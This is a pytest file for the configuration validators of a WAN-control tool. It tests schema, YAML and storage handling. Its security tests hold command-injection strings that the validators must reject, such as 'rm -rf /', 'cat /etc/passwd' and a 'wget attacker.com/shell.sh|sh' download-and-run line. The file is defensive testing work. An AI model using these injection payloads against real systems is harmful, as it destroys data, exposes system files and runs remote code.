"""Tests for config_base module - schema validation and security checks."""

from pathlib import Path

import pytest

from wanctl.config_base import (
    DEFAULT_STORAGE_DB_PATH,
    DEFAULT_STORAGE_RETENTION_DAYS,
    STORAGE_SCHEMA,
    BaseConfig,
    ConfigValidationError,
    _get_nested,
    _type_name,
    get_storage_config,
    validate_field,
    validate_schema,
)
from wanctl.config_validation_utils import validate_alpha


class TestGetNested:
    """Tests for _get_nested helper function."""

    def test_simple_key(self):
        """Test getting a top-level key."""
        data = {"key": "value"}
        assert _get_nested(data, "key") == "value"

    def test_nested_key(self):
        """Test getting a nested key with dot notation."""
        data = {"level1": {"level2": {"level3": "deep_value"}}}
        assert _get_nested(data, "level1.level2.level3") == "deep_value"

    def test_missing_key_returns_default(self):
        """Test that missing keys return the default value."""
        data = {"existing": "value"}
        assert _get_nested(data, "missing") is None
        assert _get_nested(data, "missing", "default") == "default"

    def test_missing_nested_key(self):
        """Test that missing nested keys return default."""
        data = {"level1": {"level2": "value"}}
        assert _get_nested(data, "level1.missing") is None
        assert _get_nested(data, "level1.level2.level3") is None

    def test_non_dict_in_path(self):
        """Test handling when path traverses a non-dict value."""
        data = {"level1": "string_value"}
        assert _get_nested(data, "level1.level2") is None


class TestTypeName:
    """Tests for _type_name helper function."""

    def test_none_value(self):
        """Test that None returns 'null'."""
        assert _type_name(None) == "null"

    def test_string_value(self):
        """Test string type name."""
        assert _type_name("hello") == "str"

    def test_int_value(self):
        """Test int type name."""
        assert _type_name(42) == "int"

    def test_dict_value(self):
        """Test dict type name."""
        assert _type_name({}) == "dict"

    def test_list_value(self):
        """Test list type name."""
        assert _type_name([]) == "list"


class TestValidateField:
    """Tests for validate_field function."""

    def test_valid_string_field(self):
        """Test validating a valid string field."""
        data = {"name": "test_value"}
        result = validate_field(data, "name", str)
        assert result == "test_value"

    def test_valid_nested_field(self):
        """Test validating a nested field."""
        data = {"router": {"host": "192.168.1.1"}}
        result = validate_field(data, "router.host", str)
        assert result == "192.168.1.1"

    def test_missing_required_field_raises(self):
        """Test that missing required field raises error."""
        data = {"other": "value"}
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_field(data, "missing", str, required=True)
        assert "Missing required field" in str(exc_info.value)

    def test_missing_optional_field_returns_default(self):
        """Test that missing optional field returns default."""
        data = {"other": "value"}
        result = validate_field(data, "missing", str, required=False, default="default")
        assert result == "default"

    def test_wrong_type_raises(self):
        """Test that wrong type raises error."""
        data = {"number": "not_a_number"}
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_field(data, "number", int)
        assert "Invalid type" in str(exc_info.value)

    def test_int_coerced_to_float(self):
        """Test that int is automatically coerced to float when expected."""
        data = {"value": 10}
        result = validate_field(data, "value", float)
        assert result == 10.0
        assert isinstance(result, float)

    def test_tuple_of_types(self):
        """Test validating with multiple allowed types."""
        data = {"value": 10}
        result = validate_field(data, "value", (int, float))
        assert result == 10

    def test_min_value_validation(self):
        """Test minimum value validation."""
        data = {"value": 5}
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_field(data, "value", int, min_val=10)
        assert "out of range" in str(exc_info.value)
        assert "minimum" in str(exc_info.value)

    def test_max_value_validation(self):
        """Test maximum value validation."""
        data = {"value": 100}
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_field(data, "value", int, max_val=50)
        assert "out of range" in str(exc_info.value)
        assert "maximum" in str(exc_info.value)

    def test_value_within_range(self):
        """Test value within valid range."""
        data = {"value": 50}
        result = validate_field(data, "value", int, min_val=10, max_val=100)
        assert result == 50

    def test_choices_validation_valid(self):
        """Test choices validation with valid value."""
        data = {"mode": "fast"}
        result = validate_field(data, "mode", str, choices=["slow", "fast", "turbo"])
        assert result == "fast"

    def test_choices_validation_invalid(self):
        """Test choices validation with invalid value."""
        data = {"mode": "invalid"}
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_field(data, "mode", str, choices=["slow", "fast", "turbo"])
        assert "Invalid value" in str(exc_info.value)
        assert "Must be one of" in str(exc_info.value)


class TestValidateSchema:
    """Tests for validate_schema function."""

    def test_valid_schema(self):
        """Test validating a complete valid schema."""
        data = {"name": "test", "router": {"host": "192.168.1.1"}, "value": 50}
        schema = [
            {"path": "name", "type": str, "required": True},
            {"path": "router.host", "type": str, "required": True},
            {"path": "value", "type": int, "min": 1, "max": 100},
        ]
        result = validate_schema(data, schema)
        assert result["name"] == "test"
        assert result["router.host"] == "192.168.1.1"
        assert result["value"] == 50

    def test_schema_with_defaults(self):
        """Test schema validation with default values."""
        data = {"name": "test"}
        schema = [
            {"path": "name", "type": str, "required": True},
            {"path": "optional", "type": str, "required": False, "default": "default_val"},
        ]
        result = validate_schema(data, schema)
        assert result["name"] == "test"
        assert result["optional"] == "default_val"

    def test_schema_multiple_errors(self):
        """Test that schema validation collects all errors."""
        data = {"name": 123}  # Wrong type, missing required fields
        schema = [
            {"path": "name", "type": str, "required": True},
            {"path": "host", "type": str, "required": True},
            {"path": "port", "type": int, "required": True},
        ]
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_schema(data, schema)
        error_msg = str(exc_info.value)
        assert "3 error(s)" in error_msg


class TestBaseConfigValidation:
    """Tests for BaseConfig security validation methods."""

    def test_validate_identifier_valid(self):
        """Test validating valid identifiers."""
        assert BaseConfig.validate_identifier("WAN-Download-ATT", "test") == "WAN-Download-ATT"
        assert BaseConfig.validate_identifier("queue_name", "test") == "queue_name"
        assert BaseConfig.validate_identifier("ether1.100", "test") == "ether1.100"

    def test_validate_identifier_empty(self):
        """Test that empty identifier raises error."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier("", "field_name")
        assert "cannot be empty" in str(exc_info.value)

    def test_validate_identifier_too_long(self):
        """Test that too-long identifier raises error."""
        long_name = "a" * 65
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(long_name, "field_name")
        assert "too long" in str(exc_info.value)

    def test_validate_identifier_invalid_chars(self):
        """Test that invalid characters raise error."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier("name;rm -rf /", "field_name")
        assert "invalid characters" in str(exc_info.value)

    def test_validate_identifier_special_chars(self):
        """Test various special characters that should be rejected."""
        invalid_names = [
            "name with space",
            "name`cmd`",
            "name$(cmd)",
            "name|pipe",
            "name&background",
            "name\nnewline",
        ]
        for name in invalid_names:
            with pytest.raises(ConfigValidationError):
                BaseConfig.validate_identifier(name, "test")

    def test_validate_comment_valid(self):
        """Test validating valid comments."""
        assert (
            BaseConfig.validate_comment("ADAPTIVE: Steer to ATT", "test")
            == "ADAPTIVE: Steer to ATT"
        )
        assert BaseConfig.validate_comment("Simple comment", "test") == "Simple comment"

    def test_validate_comment_empty(self):
        """Test that empty comment raises error."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_comment("", "field_name")
        assert "cannot be empty" in str(exc_info.value)

    def test_validate_comment_too_long(self):
        """Test that too-long comment raises error."""
        long_comment = "a" * 129
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_comment(long_comment, "field_name")
        assert "too long" in str(exc_info.value)

    def test_validate_comment_invalid_chars(self):
        """Test that dangerous characters in comments raise error."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_comment("comment;rm -rf /", "field_name")
        assert "invalid characters" in str(exc_info.value)

    def test_validate_identifier_non_string(self):
        """Test that non-string identifier raises error."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_identifier(123, "field_name")
        assert "expected string" in str(exc_info.value)

    def test_validate_comment_non_string(self):
        """Test that non-string comment raises error."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_comment(123, "field_name")
        assert "expected string" in str(exc_info.value)


class TestValidatePingHost:
    """Tests for validate_ping_host security validation."""

    # -------------------------------------------------------------------------
    # Valid inputs
    # -------------------------------------------------------------------------

    def test_valid_ipv4_addresses(self):
        """Test valid IPv4 addresses are accepted."""
        valid_ipv4s = [
            "1.1.1.1",
            "8.8.8.8",
            "192.168.1.1",
            "10.0.0.1",
            "255.255.255.255",
            "0.0.0.0",
        ]
        for ip in valid_ipv4s:
            result = BaseConfig.validate_ping_host(ip, "ping_host")
            assert result == ip

    def test_valid_ipv6_addresses(self):
        """Test valid IPv6 addresses are accepted."""
        valid_ipv6s = [
            "2001:4860:4860::8888",
            "2001:4860:4860::8844",
            "::1",
            "fe80::1",
            "2607:f8b0:4004:800::200e",
        ]
        for ip in valid_ipv6s:
            result = BaseConfig.validate_ping_host(ip, "ping_host")
            assert result == ip

    def test_valid_hostnames(self):
        """Test valid hostnames are accepted."""
        valid_hostnames = [
            "dns.google",
            "cloudflare.com",
            "one.one.one.one",
            "example.com",
            "sub.domain.example.org",
            "a.b.c.d.e.f.example.com",
        ]
        for hostname in valid_hostnames:
            result = BaseConfig.validate_ping_host(hostname, "ping_host")
            assert result == hostname

    def test_valid_single_label_hostname(self):
        """Test single-label hostnames are valid."""
        assert BaseConfig.validate_ping_host("localhost", "host") == "localhost"
        assert BaseConfig.validate_ping_host("router", "host") == "router"

    def test_hostname_with_numbers(self):
        """Test hostnames containing numbers are valid."""
        assert BaseConfig.validate_ping_host("ns1.google.com", "host") == "ns1.google.com"
        assert BaseConfig.validate_ping_host("1e100.net", "host") == "1e100.net"

    def test_hostname_with_hyphens(self):
        """Test hostnames with hyphens are valid."""
        assert BaseConfig.validate_ping_host("my-router.local", "host") == "my-router.local"
        assert (
            BaseConfig.validate_ping_host("test-1-2-3.example.com", "host")
            == "test-1-2-3.example.com"
        )

    # -------------------------------------------------------------------------
    # Command injection attacks (security-critical)
    # -------------------------------------------------------------------------

    def test_command_injection_semicolon(self):
        """Test that semicolon injection is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("127.0.0.1; cat /etc/passwd", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_backticks(self):
        """Test that backtick command substitution is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("`whoami`", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_dollar_paren(self):
        """Test that $() command substitution is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("$(whoami)", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_pipe(self):
        """Test that pipe injection is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("127.0.0.1 | rm -rf /", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_ampersand(self):
        """Test that ampersand injection is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("127.0.0.1 && rm -rf /", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_newline(self):
        """Test that newline injection is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("127.0.0.1\nrm -rf /", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_redirect(self):
        """Test that redirect injection is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("127.0.0.1 > /tmp/pwned", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_variable_expansion(self):
        """Test that shell variable expansion is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("${PATH}", "ping_host")
        assert "must be valid IPv4, IPv6" in str(exc_info.value)

    def test_command_injection_complex_payload(self):
        """Test complex injection payloads are rejected."""
        payloads = [
            "1.1.1.1;id",
            "1.1.1.1|id",
            "1.1.1.1`id`",
            "1.1.1.1$(id)",
            "a]&&id||[",
            "google.com;wget attacker.com/shell.sh|sh",
        ]
        for payload in payloads:
            with pytest.raises(ConfigValidationError):
                BaseConfig.validate_ping_host(payload, "ping_host")

    # -------------------------------------------------------------------------
    # Invalid hostname patterns
    # -------------------------------------------------------------------------

    def test_hostname_starting_with_hyphen(self):
        """Test hostname starting with hyphen is invalid."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_ping_host("-invalid.com", "host")

    def test_hostname_ending_with_hyphen(self):
        """Test hostname ending with hyphen is invalid."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_ping_host("invalid-.com", "host")

    def test_hostname_with_underscore(self):
        """Test hostname with underscore is invalid (per RFC)."""
        # Note: underscores are technically invalid in hostnames per RFC 1123
        # but some systems accept them. This tests the strict validation.
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_ping_host("invalid_host.com", "host")

    def test_hostname_with_spaces(self):
        """Test hostname with spaces is invalid."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_ping_host("invalid host.com", "host")

    def test_hostname_label_too_long(self):
        """Test hostname with label > 63 chars is invalid."""
        long_label = "a" * 64 + ".com"
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_ping_host(long_label, "host")

    # -------------------------------------------------------------------------
    # IPv4-like patterns behavior
    # Note: These strings match the hostname regex even though they look like
    # malformed IPv4. This is expected behavior since the validator accepts
    # valid hostnames, and "256.1.1.1" is a valid hostname syntax-wise.
    # -------------------------------------------------------------------------

    def test_ipv4_like_strings_accepted_as_hostnames(self):
        """Test that IPv4-like strings are accepted as valid hostnames.

        The validator checks: valid IPv4 OR valid IPv6 OR valid hostname.
        Strings like '256.1.1.1' or '192.168.1' fail IPv4 validation but
        pass hostname validation (since they're syntactically valid hostnames).
        This is correct behavior - DNS could resolve these names.
        """
        # These fail IPv4 validation but pass hostname validation
        assert BaseConfig.validate_ping_host("256.1.1.1", "ping_host") == "256.1.1.1"
        assert BaseConfig.validate_ping_host("192.168.1", "ping_host") == "192.168.1"
        assert BaseConfig.validate_ping_host("192.168.1.1.1", "ping_host") == "192.168.1.1.1"

    def test_invalid_ipv4_negative_octet(self):
        """Test IPv4 with negative octet is rejected (hyphen at start of label)."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_ping_host("-1.1.1.1", "ping_host")

    # -------------------------------------------------------------------------
    # Edge cases
    # -------------------------------------------------------------------------

    def test_empty_string_rejected(self):
        """Test empty string is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host("", "ping_host")
        assert "cannot be empty" in str(exc_info.value)

    def test_non_string_rejected(self):
        """Test non-string input is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host(123, "ping_host")
        assert "expected string" in str(exc_info.value)

    def test_none_rejected(self):
        """Test None is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host(None, "ping_host")
        assert "expected string" in str(exc_info.value)

    def test_list_rejected(self):
        """Test list is rejected."""
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host(["1.1.1.1"], "ping_host")
        assert "expected string" in str(exc_info.value)

    def test_too_long_rejected(self):
        """Test string exceeding max length is rejected."""
        long_host = "a." * 130  # 260 chars > 256 max
        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig.validate_ping_host(long_host, "ping_host")
        assert "too long" in str(exc_info.value)


class TestValidateIdentifierSecurityEdgeCases:
    """Additional security edge cases for validate_identifier."""

    def test_command_injection_dollar_paren(self):
        """Test $() command substitution is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue$(id)", "queue_name")

    def test_command_injection_backticks(self):
        """Test backtick command substitution is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue`id`", "queue_name")

    def test_shell_variable_expansion(self):
        """Test shell variable expansion is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue${PATH}", "queue_name")

    def test_double_quotes(self):
        """Test double quotes are rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier('queue"injection', "queue_name")

    def test_single_quotes(self):
        """Test single quotes are rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue'injection", "queue_name")

    def test_hash_comment(self):
        """Test hash comment injection is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue#comment", "queue_name")

    def test_newline_with_command(self):
        """Test newline followed by command is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue\nrm -rf /", "queue_name")

    def test_carriage_return_injection(self):
        """Test carriage return injection is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue\r\nrm -rf /", "queue_name")

    def test_null_byte_injection(self):
        """Test null byte injection is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue\x00command", "queue_name")

    def test_unicode_bypass_attempt(self):
        """Test unicode lookalike characters are rejected."""
        # Using a unicode semicolon (GREEK QUESTION MARK U+037E looks like ;)
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_identifier("queue\u037ecommand", "queue_name")


class TestValidateCommentSecurityEdgeCases:
    """Additional security edge cases for validate_comment."""

    def test_double_quotes_rejected(self):
        """Test double quotes are rejected in comments."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment('comment"injection', "comment")

    def test_single_quotes_rejected(self):
        """Test single quotes are rejected in comments."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment'injection", "comment")

    def test_backticks_rejected(self):
        """Test backticks are rejected in comments."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment`id`", "comment")

    def test_dollar_paren_rejected(self):
        """Test $() is rejected in comments."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment$(id)", "comment")

    def test_shell_variable_rejected(self):
        """Test shell variables are rejected in comments."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment${PATH}", "comment")

    def test_newline_injection_rejected(self):
        """Test newline injection is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment\nrm -rf /", "comment")

    def test_pipe_rejected(self):
        """Test pipe character is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment|command", "comment")

    def test_semicolon_rejected(self):
        """Test semicolon is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment;rm -rf /", "comment")

    def test_ampersand_rejected(self):
        """Test ampersand is rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment&&rm -rf /", "comment")

    def test_redirect_rejected(self):
        """Test redirect characters are rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment>/tmp/pwned", "comment")

    def test_parentheses_rejected(self):
        """Test parentheses are rejected."""
        with pytest.raises(ConfigValidationError):
            BaseConfig.validate_comment("comment(subshell)", "comment")

    def test_valid_adaptive_steer_comment(self):
        """Test the actual production comment format is valid."""
        comment = "ADAPTIVE: Steer latency-sensitive to ATT"
        result = BaseConfig.validate_comment(comment, "mangle_comment")
        assert result == comment

    def test_valid_rule_name_comment(self):
        """Test rule name with allowed characters."""
        comment = "Rule-Name_123: Description here"
        result = BaseConfig.validate_comment(comment, "mangle_comment")
        assert result == comment


class TestYAMLParseErrors:
    """Tests for YAML parse error handling with line numbers."""

    def test_invalid_yaml_raises_config_validation_error(self, tmp_path):
        """Invalid YAML raises ConfigValidationError with 'line' in message."""
        config_file = tmp_path / "bad.yaml"
        config_file.write_text("key: [unclosed\n")

        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig(str(config_file))
        assert "line" in str(exc_info.value).lower()

    def test_valid_yaml_still_loads(self, tmp_path):
        """Valid YAML loads correctly (no regression)."""
        config_file = tmp_path / "good.yaml"
        config_file.write_text("""
wan_name: test
router:
  host: "192.168.1.1"
  user: admin
  ssh_key: "/path/to/key"
logging:
  main_log: "/tmp/test.log"
  debug_log: "/tmp/test_debug.log"
lock_file: "/tmp/test.lock"
lock_timeout: 300
""")
        config = BaseConfig(str(config_file))
        assert config.wan_name == "test"

    def test_yaml_tab_indentation_error_includes_line(self, tmp_path):
        """YAML with tab indentation error includes line number."""
        config_file = tmp_path / "tabs.yaml"
        config_file.write_text("key:\n\t- value\n")

        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig(str(config_file))
        assert "line" in str(exc_info.value).lower()

    def test_yaml_error_includes_config_path(self, tmp_path):
        """YAML parse error message includes the config file path."""
        config_file = tmp_path / "bad.yaml"
        config_file.write_text("key: {unclosed\n")

        with pytest.raises(ConfigValidationError) as exc_info:
            BaseConfig(str(config_file))
        assert "bad.yaml" in str(exc_info.value)


class TestSchemaVersioning:
    """Tests for configuration schema versioning."""

    def test_current_schema_version_constant(self):
        """Test that CURRENT_SCHEMA_VERSION is defined."""
        assert hasattr(BaseConfig, "CURRENT_SCHEMA_VERSION")
        assert BaseConfig.CURRENT_SCHEMA_VERSION == "1.0"

    def test_schema_version_stored_on_instance(self, tmp_path):
        """Test that schema_version is stored on config instance."""
        config_file = tmp_path / "test.yaml"
        config_file.write_text("""
schema_version: "1.0"
wan_name: test
router:
  host: "192.168.1.1"
  user: admin
  ssh_key: "/path/to/key"
logging:
  main_log: "/tmp/test.log"
  debug_log: "/tmp/test_debug.log"
lock_file: "/tmp/test.lock"
lock_timeout: 300
""")
        config = BaseConfig(str(config_file))
        assert hasattr(config, "schema_version")
        assert config.schema_version == "1.0"

    def test_missing_schema_version_defaults_to_1_0(self, tmp_path):
        """Test that missing schema_version defaults to 1.0."""
        config_file = tmp_path / "test.yaml"
        # Legacy config without schema_version
        config_file.write_text("""
wan_name: test
router:
  host: "192.168.1.1"
  user: admin
  ssh_key: "/path/to/key"
logging:
  main_log: "/tmp/test.log"
  debug_log: "/tmp/test_debug.log"
lock_file: "/tmp/test.lock"
lock_timeout: 300
""")
        config = BaseConfig(str(config_file))
        assert config.schema_version == "1.0"

    def test_different_schema_version_logs_info(self, tmp_path, caplog):
        """Test that different schema version logs info message."""
        import logging

        config_file = tmp_path / "test.yaml"
        config_file.write_text("""
schema_version: "0.9"
wan_name: test
router:
  host: "192.168.1.1"
  user: admin
  ssh_key: "/path/to/key"
logging:
  main_log: "/tmp/test.log"
  debug_log: "/tmp/test_debug.log"
lock_file: "/tmp/test.lock"
lock_timeout: 300
""")
        with caplog.at_level(logging.INFO):
            config = BaseConfig(str(config_file))

        assert config.schema_version == "0.9"
        assert "Config schema version 0.9" in caplog.text
        assert "current: 1.0" in caplog.text

    def test_current_schema_version_no_log(self, tmp_path, caplog):
        """Test that current schema version does not log."""
        import logging

        config_file = tmp_path / "test.yaml"
        config_file.write_text("""
schema_version: "1.0"
wan_name: test
router:
  host: "192.168.1.1"
  user: admin
  ssh_key: "/path/to/key"
logging:
  main_log: "/tmp/test.log"
  debug_log: "/tmp/test_debug.log"
lock_file: "/tmp/test.lock"
lock_timeout: 300
""")
        with caplog.at_level(logging.INFO):
            config = BaseConfig(str(config_file))

        assert config.schema_version == "1.0"
        assert "Config schema version" not in caplog.text


class TestStorageConfig:
    """Tests for storage configuration helpers."""

    def test_storage_schema_defined(self):
        """Test STORAGE_SCHEMA is defined with expected fields."""
        paths = [spec["path"] for spec in STORAGE_SCHEMA]
        assert "storage.retention_days" in paths
        assert "storage.db_path" in paths

    def test_storage_schema_defaults(self):
        """Test STORAGE_SCHEMA has correct defaults."""
        for spec in STORAGE_SCHEMA:
            if spec["path"] == "storage.retention_days":
                assert spec["default"] == 7
                assert spec["required"] is False
                assert spec["min"] == 1
                assert spec["max"] == 365
            elif spec["path"] == "storage.db_path":
                assert spec["default"] == "/var/lib/wanctl/metrics.db"
                assert spec["required"] is False

    def test_default_constants(self):
        """Test storage default constants."""
        assert DEFAULT_STORAGE_RETENTION_DAYS == 7
        assert DEFAULT_STORAGE_DB_PATH == "/var/lib/wanctl/metrics.db"

    def test_get_storage_config_defaults(self):
        """Test get_storage_config returns defaults when storage section missing."""
        data = {}
        result = get_storage_config(data)

        assert result["retention_days"] == 7
        assert result["db_path"] == "/var/lib/wanctl/metrics.db"

    def test_get_storage_config_empty_storage_section(self):
        """Test get_storage_config with empty storage section."""
        data = {"storage": {}}
        result = get_storage_config(data)

        assert result["retention_days"] == 7
        assert result["db_path"] == "/var/lib/wanctl/metrics.db"

    def test_get_storage_config_custom_values(self):
        """Test get_storage_config with custom values."""
        data = {
            "storage": {
                "retention_days": 30,
                "db_path": "/custom/path/metrics.db",
            }
        }
        result = get_storage_config(data)

        assert result["retention_days"] == 30
        assert result["db_path"] == "/custom/path/metrics.db"

    def test_get_storage_config_partial_values(self):
        """Test get_storage_config with partial values."""
        data = {"storage": {"retention_days": 14}}
        result = get_storage_config(data)

        assert result["retention_days"] == 14
        assert result["db_path"] == "/var/lib/wanctl/metrics.db"

    def test_storage_schema_validation_valid(self):
        """Test STORAGE_SCHEMA validation with valid values."""
        data = {
            "storage": {
                "retention_days": 30,
                "db_path": "/custom/path.db",
            }
        }
        result = validate_schema(data, STORAGE_SCHEMA)

        assert result["storage.retention_days"] == 30
        assert result["storage.db_path"] == "/custom/path.db"

    def test_storage_schema_validation_defaults(self):
        """Test STORAGE_SCHEMA validation uses defaults when missing."""
        data = {}
        result = validate_schema(data, STORAGE_SCHEMA)

        assert result["storage.retention_days"] == 7
        assert result["storage.db_path"] == "/var/lib/wanctl/metrics.db"

    def test_storage_schema_validation_retention_too_low(self):
        """Test STORAGE_SCHEMA validates retention_days minimum."""
        data = {"storage": {"retention_days": 0}}
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_schema(data, STORAGE_SCHEMA)
        assert "out of range" in str(exc_info.value)

    def test_storage_schema_validation_retention_too_high(self):
        """Test STORAGE_SCHEMA validates retention_days maximum."""
        data = {"storage": {"retention_days": 500}}
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_schema(data, STORAGE_SCHEMA)
        assert "out of range" in str(exc_info.value)


class TestBaseConfigCommonFields:
    """Tests for BaseConfig common field loading (logging + lock)."""

    MINIMAL_YAML = """\
wan_name: test
router:
  host: "192.168.1.1"
  user: admin
  ssh_key: "/path/to/key"
logging:
  main_log: "/var/log/wanctl/main.log"
  debug_log: "/var/log/wanctl/debug.log"
lock_file: "/tmp/wanctl_test.lock"
lock_timeout: 300
"""

    def test_base_schema_contains_logging_fields(self):
        """Test BASE_SCHEMA includes logging.max_bytes and logging.backup_count."""
        paths = [spec["path"] for spec in BaseConfig.BASE_SCHEMA]
        assert "logging.main_log" in paths
        assert "logging.debug_log" in paths
        assert "logging.max_bytes" in paths
        assert "logging.backup_count" in paths

    def test_base_schema_contains_lock_fields(self):
        """Test BASE_SCHEMA includes lock_file and lock_timeout."""
        paths = [spec["path"] for spec in BaseConfig.BASE_SCHEMA]
        assert "lock_file" in paths
        assert "lock_timeout" in paths

    def test_common_fields_loaded_from_yaml(self, tmp_path):
        """Test BaseConfig loads common logging/lock fields from YAML."""
        config_file = tmp_path / "config.yaml"
        config_file.write_text(self.MINIMAL_YAML)

        config = BaseConfig(str(config_file))

        assert config.main_log == "/var/log/wanctl/main.log"
        assert config.debug_log == "/var/log/wanctl/debug.log"
        assert config.lock_timeout == 300
        assert isinstance(config.lock_file, Path)
        assert str(config.lock_file) == "/tmp/wanctl_test.lock"

    def test_max_bytes_defaults_to_10mb(self, tmp_path):
        """Test max_bytes defaults to 10485760 when not in YAML."""
        config_file = tmp_path / "config.yaml"
        config_file.write_text(self.MINIMAL_YAML)

        config = BaseConfig(str(config_file))

        assert config.max_bytes == 10_485_760

    def test_backup_count_defaults_to_3(self, tmp_path):
        """Test backup_count defaults to 3 when not in YAML."""
        config_file = tmp_path / "config.yaml"
        config_file.write_text(self.MINIMAL_YAML)

        config = BaseConfig(str(config_file))

        assert config.backup_count == 3

    def test_max_bytes_and_backup_count_overridden(self, tmp_path):
        """Test max_bytes and backup_count can be overridden in YAML."""
        (
            self.MINIMAL_YAML
            + """\
  max_bytes: 5242880
  backup_count: 5
"""
        )
        # Need to insert into logging section, not at top level
        config_file = tmp_path / "config.yaml"
        config_file.write_text("""\
wan_name: test
router:
  host: "192.168.1.1"
  user: admin
  ssh_key: "/path/to/key"
logging:
  main_log: "/var/log/wanctl/main.log"
  debug_log: "/var/log/wanctl/debug.log"
  max_bytes: 5242880
  backup_count: 5
lock_file: "/tmp/wanctl_test.lock"
lock_timeout: 300
""")

        config = BaseConfig(str(config_file))

        assert config.max_bytes == 5_242_880
        assert config.backup_count == 5

    def test_lock_file_is_path_object(self, tmp_path):
        """Test lock_file is converted to Path object."""
        config_file = tmp_path / "config.yaml"
        config_file.write_text(self.MINIMAL_YAML)

        config = BaseConfig(str(config_file))

        assert isinstance(config.lock_file, Path)

    def test_schema_rejects_max_bytes_below_min(self):
        """Test schema validation rejects max_bytes below 1MB."""
        data = {
            "wan_name": "test",
            "router": {"host": "1.1.1.1", "user": "admin", "ssh_key": "/k"},
            "logging": {
                "main_log": "/tmp/m.log",
                "debug_log": "/tmp/d.log",
                "max_bytes": 500_000,  # Below 1MB minimum
            },
            "lock_file": "/tmp/t.lock",
            "lock_timeout": 300,
        }
        with pytest.raises(ConfigValidationError) as exc_info:
            validate_schema(data, BaseConfig.BASE_SCHEMA)
        assert "out of range" in str(exc_info.value)

    def test_schema_rejects_backup_count_below_1(self):
        """Test schema validation rejects backup_count below 1."""
        data = {
            "wan_name": "test",
            "router": {"host": "1.1.1.1", "user": "admin", "ssh_key": "/k"},
            "logging": {
                "main_log": "/tmp/m.log",
                "debug_log": "/tmp/d.log",
                "backup_count": 0,  # Below minimum 1
            },
            "lock_file": "/tmp/t.lock",
            "lock_timeout": 300,
        }
        with pytest.raises(ConfigValidationError) as exc_info:
